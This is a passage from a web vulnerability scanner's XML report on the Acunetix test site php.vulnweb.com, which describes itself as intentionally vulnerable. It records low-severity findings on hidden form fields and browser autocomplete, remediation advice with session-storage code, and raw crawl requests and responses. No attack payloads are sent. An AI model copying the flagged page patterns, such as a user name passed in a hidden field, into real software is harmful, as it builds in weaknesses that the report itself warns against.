<br /><br /><ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><br /><br /><li>Use what is good instead of what is bad. </li><br /><br /><li>Validate input for improper characters. </li><br /><br /><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><br /><br /><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><br /><br /><li>Define the maximum and minimum data lengths for what the application will accept. </li><br /><br /><li>Specify acceptable numeric ranges for input. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[While preventing display of information on the web page itself, the information submitted via hidden form fields is easily accessible, and could give an attacker valuable information that would prove helpful in escalating his attack methodology. Recommendations include not relying on hidden form fields as a security solution for any area of the web application that contains sensitive information or access to privileged functionality such as remote site administration functionality.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[The greatest danger from exploitation of a hidden form field design vulnerability is that the attacker will gain information that will help in orchestrating a far more dangerous attack.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[Any attacker could bypass a hidden form field security solution by viewing the source code of that particular page.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed at a convenient time.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Do not rely on hidden form fields as a method of passing sensitive information or maintaining session state.  One workable bypass is to encrypt the hidden values in a form, and then decrypt them when that information is to be utilized by a database operation or a script. From a security standpoint, the best method of temporarily storing information required by different forms is to utilize a session cookie. 
<br /><br />
Whether hidden or not, if your site utilizes values submitted via a form to construct database queries, do not make the assumption that the data is non-malicious. Instead, utilize the following recommendations to sanitize user supplied input.
<ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, only let that field accept numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input. </li></ul>

ASP.NET provides the Session object to store arbitrary application data that will be preserved across HTTP requests for a given user. You can store strings or arbitrarily complex objects as well.<br /><br />
C# examples:<br /><br />
  Session["myvar"] = "value";                 // Store a value<br />
  string value = Session["myvar"].ToString(); // Retrieve a value<br /><br />
VB.NET examples:<br /><br />
  Session.Item("myvar") = "value"            ' Store a value<br />
  Dim value As String = Session.Item("myvar").ToString() ' Retrieve a value
<br /><br />
Be sure to configure the <sessionstate> element in your web.config correctly. There are a number of options to control where the state is stored, whether it is shared across a web farm, and so on. Consult MSDN for details.
</sessionstate>]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
Do not rely on hidden form fields as a method of passing sensitive information or maintaining session state. One workable bypass is to encrypt the hidden values in a form, and then decrypt them when that information is to be used by a database operation or a script. From a security standpoint, the best method of temporarily storing information required by different forms is to use a session cookie. <br /><br />
Whether hidden or not, if your site uses values submitted via a form to construct database queries, do not make the assumption that the data is non-malicious. Instead, use the following recommendations to sanitize user supplied input. 
<ul><li>Stringently define the data type (a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be used in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. </li><li>Define the maximum and minimum data lengths that the application will accept. </li><li>Specify acceptable numeric ranges for input. </li></ul>
The Java 2 Platform, Enterprise Edition (J2EE) platform provides the Session object to store arbitrary application data that will be preserved across HTTP requests for a given user. You can store strings or arbitrarily complex objects as shown below: <br /><br />
session.setAttribute(“myAttr”, “value”);   //Store a value<br />
String value = session.getAttribute(“myAttr”);  //Retrieve a value]]></SectionText></ReportSection></Issue><Issue id="9678d44b-8bec-4668-9358-6352af96bdeb"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="3152" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="4B3049C9BE5176469488667153D76A50"><![CDATA[GET /guestbook.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="4B3049C9BE5176469488667153D76A50";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="62";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="6efd9f65";
X-Request-Memo: ID="c4f2048f";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:25 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5390

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>guestbook</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<table width="100%" cellpadding="4" cellspacing="1"><tr><td colspan="2"><h2>Our guestbook</h2></td></tr><tr><td align="left" valign="middle" style="background-color:#F5F5F5"><strong></strong></td><td align="right" style="background-color:#F5F5F5">12.11.2020, 9:44 pm</td></tr><tr><td colspan="2"><img src="/images/remark.gif">&nbsp;&nbsp;</td></tr></table>	 </div>
	  <div class="story">
	  	<form action="" method="post" name="faddentry">
			<input type="hidden" name="name" value="anonymous user">
			<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;"></textarea>
			<br>
			<input type="submit" name="submit" value="add message">
		</form>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="4B3049C9BE5176469488667153D76A50"><Method>GET</Method><Path>/</Path><File>guestbook</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="4B3049C9BE5176469488667153D76A50";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="62";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="6efd9f65";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c4f2048f";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>guestbook</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<table width="100%" cellpadding="4" cellspacing="1"><tr><td colspan="2"><h2>Our guestbook</h2></td></tr><tr><td align="left" valign="middle" style="background-color:#F5F5F5"><strong></strong></td><td align="right" style="background-color:#F5F5F5">12.11.2020, 9:44 pm</td></tr><tr><td colspan="2"><img src="/images/remark.gif">&nbsp;&nbsp;</td></tr></table>	 </div>
	  <div class="story">
	  	<form action="" method="post" name="faddentry">
			<input type="hidden" name="name" value="anonymous user">
			<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;"></textarea>
			<br>
			<input type="submit" name="submit" value="add message">
		</form>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:25 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5390</Value></Header></Headers><SetCookies /><Forms><Form><Action /><Method>post</Method><Name>faddentry</Name><OnSubmit /><InputFields><InputField><Name>name</Name><Value>anonymous user</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>submit</Name><Value>add message</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas><TextArea><Name>text</Name><Value /><MaxLength>0</MaxLength><Class /></TextArea></TextAreas><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="67A382E58832D0E992D8F6EE34F2453D"><URL>http://php.vulnweb.com:80/index.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="54c0f557-577a-4569-b124-9106386e9b68"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2623" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="67A382E58832D0E992D8F6EE34F2453D"><![CDATA[GET /index.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="67A382E58832D0E992D8F6EE34F2453D";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="60";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="46013cb3";
X-Request-Memo: ID="59465e46";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:25 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4958

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of Acunetix Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for Acunetix WVS.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | <a href="/Mod_Rewrite_Shop/">Shop</a> | <a href="/hpp/">HTTP Parameter Pollution</a> | &copy;2019
  Acunetix Ltd 
</div> 
    
    
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="67A382E58832D0E992D8F6EE34F2453D"><Method>GET</Method><Path>/</Path><File>index</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="67A382E58832D0E992D8F6EE34F2453D";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="60";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="46013cb3";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="59465e46";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
